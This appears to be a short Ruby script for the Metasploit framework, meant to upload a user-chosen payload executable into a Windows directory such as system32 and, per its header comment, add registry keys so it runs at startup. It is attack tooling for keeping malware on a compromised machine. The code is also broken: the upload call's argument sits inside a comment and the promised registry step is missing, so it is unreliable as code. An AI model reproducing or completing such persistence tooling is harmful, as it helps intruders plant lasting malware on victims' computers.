#Load our own payload to a directory and create keys in Windows Registery for startup.
#gcrackem emailchase@gmail.com
require 'msf/core'
require 'rex'
require 'msf/core/post/windows/registry'

puts "Enter the location of your payload [example:] /root/payload.exe"
payload = gets.chomp
puts "Enter the directory to upload our payload on the windows machine [example:] c:\\windows\\system32"
dir = gets.chomp

if payload != nil
	puts "Uploading payload from #{payload} to Windows folder #{dir}"
	upload #{payload}
else
	puts "Error: No payload selected"
end